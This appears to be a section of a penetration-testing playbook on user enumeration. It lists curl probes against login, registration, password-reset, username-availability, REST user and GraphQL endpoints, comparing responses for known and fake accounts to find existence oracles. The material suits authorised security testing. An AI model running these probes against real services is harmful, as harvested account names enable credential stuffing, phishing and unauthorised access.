# Per-endpoint (deep) — each endpoint's full probe

## /login — every channel

```bash
# body
curl -s -X POST -d "user=$KNOWN&pass=x" "$BASE/login" > g; curl -s -X POST -d "user=$FAKE&pass=x" "$BASE/login" > b
diff <(mask<g) <(mask<b)
# status + Location
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' -X POST -d "user=$KNOWN&pass=x" "$BASE/login"
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' -X POST -d "user=$FAKE&pass=x"  "$BASE/login"
# envelope
curl -sv -X POST -d "user=$KNOWN&pass=x" "$BASE/login" 2>&1 | grep -iE 'set-cookie|x-|HTTP'
# timing — N>=8 interleaved
# lockout — N attempts on your OWN known-good
```

## /register — every channel

```bash
curl -s -X POST -d "user=$KNOWN&email=a@b.c&pass=x&pass2=x" "$BASE/register" > rg
curl -s -X POST -d "user=$FAKE&email=b@b.c&pass=x&pass2=x"  "$BASE/register" > rb
diff rg rb; grep -oiE '(taken|exist|already|registered|unavailable)[^<"]*' rg rb
# the register's AJAX check — the direct oracle it calls
grep -oE '(check|available|exists|username|email)[^"'"'"']*' rg.html
```

## /forgot-password + /reset

```bash
curl -i -X POST -d "email=$KNOWN" "$BASE/forgot-password" > fg
curl -i -X POST -d "email=$FAKE"  "$BASE/forgot-password" > fb
diff fg fb; grep -oE '(sent|queued|exist|emails|to)[^,}<"]*' fg fb
# + the send side-effect: does YOUR email get it?
# + timing: the send/lookup gap
```

## /check-username + /available — the direct boolean

```bash
for u in "$KNOWN" "$FAKE" "$FAKE"; do
  curl -s "$BASE/api/username-available?u=$u"
done
# {"available":false} vs {"available":true} — direct oracle
```

## /api/login + /token

```bash
curl -s -X POST -H 'Content-Type: application/json' -d "{\"username\":\"$KNOWN\",\"password\":\"x\"}" "$BASE/api/login"
curl -s -X POST -H 'Content-Type: application/json' -d "{\"username\":\"$FAKE\",\"password\":\"x\"}"  "$BASE/api/login"
# JSON error-code/boolean; a 404 vs 401
```

## /api/users/{name} — the REST oracle

```bash
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$KNOWN"
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/api/users/$FAKE"
# 200 vs 404 — the existence oracle + a web-idor read
```

## /graphql — the resolvers

```bash
curl -s -X POST -H 'Content-Type: application/json' -d '{"query":"query{userByEmail(email:\"'$KNOWN'\"){id}}"}' "$BASE/graphql"
curl -s -X POST -H 'Content-Type: application/json' -d '{"query":"mutation{login(username:\"'$KNOWN'\",password:\"x\"){token}}"}' "$BASE/graphql"
```

## The alias sweep — the same logic, different route

```bash
for ep in /login /login/ /api/login /api/v1/login /auth /signin /session; do
  printf '%s ' "$ep"; curl -s -o /dev/null -w '%{http_code}\n' -X POST -d "user=$KNOWN&pass=x" "$BASE$ep"
done
```
